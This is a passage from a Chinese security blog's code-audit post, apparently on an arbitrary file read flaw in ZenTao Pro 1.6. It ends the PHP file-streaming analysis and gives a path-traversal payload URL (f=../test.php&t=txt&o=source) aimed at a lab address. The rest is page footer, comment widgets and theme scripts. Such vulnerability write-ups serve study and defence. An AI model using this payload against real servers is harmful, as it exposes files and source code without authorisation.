+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Range: bytes </span><span class="si">$start</span><span class="s2">-</span><span class="si">$end</span><span class="s2">/</span><span class="si">$length</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Length: &#34;</span> <span class="o">.</span> <span class="nv">$length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$buffer</span> <span class="o">=</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">=</span> <span class="nx">ftell</span><span class="p">(</span><span class="nv">$handle</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="nv">$end</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$p</span> <span class="o">+</span> <span class="nv">$buffer</span> <span class="o">&gt;</span> <span class="nv">$end</span><span class="p">)</span> <span class="nv">$buffer</span> <span class="o">=</span> <span class="nv">$end</span> <span class="o">-</span> <span class="nv">$p</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nv">$buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">flush</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$handle</span><span class="p">))</span> <span class="k">echo</span> <span class="nx">fgets</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><ol start="5">
+<li>那么到这里就开始构思怎么样去构造Payload：</li>
+</ol>
+<ul>
+<li>o参数必须为<code>source</code></li>
+<li>t参数必须对应的Content-type的值为<code>text/plain</code></li>
+<li>f参数文件的相对路径</li>
+</ul>
+<p>那么我们最终的Payload为：
+http://192.168.86.130/file.php?f=../test.php&amp;t=txt&amp;o=source
+或者
+http://192.168.86.130/file.php?pathname=../test.php&amp;extension=txt&amp;objectType=source</p>
+<h1 id="0x05-参考">0x05 参考</h1>
+<p><a href="https://www.cnblogs.com/52fhy/p/5436673.html">https://www.cnblogs.com/52fhy/p/5436673.html</a>
+<a href="http://www.lsafe.org/?p=262">http://www.lsafe.org/?p=262</a></p>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/zen-knowledge-pro-1.6-front-end-arbitrary-file-reading-analysis.html">https://xxe.icu/zen-knowledge-pro-1.6-front-end-arbitrary-file-reading-analysis.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        <div class="text-base md:text-sm text-gray-500 pt-6">
+                <a class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 hover:bg-gray-300"
+                    href="https://xxe.icu/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html">
+                    #代码审计
+                </a>
+                                    
+            </div>
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/cve-2018-1000094-cmsms-2.2.5-code-execution-vulnerability.html" class="underline text-yellow-600">CVE-2018-1000094-CMSMS 2.2.5代码执行漏洞(每周一洞)</a></li>
+    
+    <li><a href="/phpok4.9-background-getshell.html" class="underline text-yellow-600">phpok4.9后台getshell(每周一洞)</a></li>
+    
+    <li><a href="/phpok-4.9-code-audit.html" class="underline text-yellow-600">phpok 4.9代码审计(每周一洞)</a></li>
+    
+    <li><a href="/dedecms-v5.7-background-filtering-improperly-leads-to-getshell.html" class="underline text-yellow-600">DedeCMS V5.7后台过滤不当导致Getshell(每周一洞)</a></li>
+    
+    <li><a href="/hdwiki-v6.0_latest_version_of_referer_injection_vulnerability.html" class="underline text-yellow-600">HDWiki v6.0最新版referer注入漏洞(每周一洞)</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-前言">0x01 前言</a></li>
+    <li><a href="#0x02-环境">0x02 环境</a></li>
+    <li><a href="#0x03-漏洞复现">0x03 漏洞复现</a></li>
+    <li><a href="#0x04-漏洞分析">0x04 漏洞分析</a></li>
+    <li><a href="#0x05-参考">0x05 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
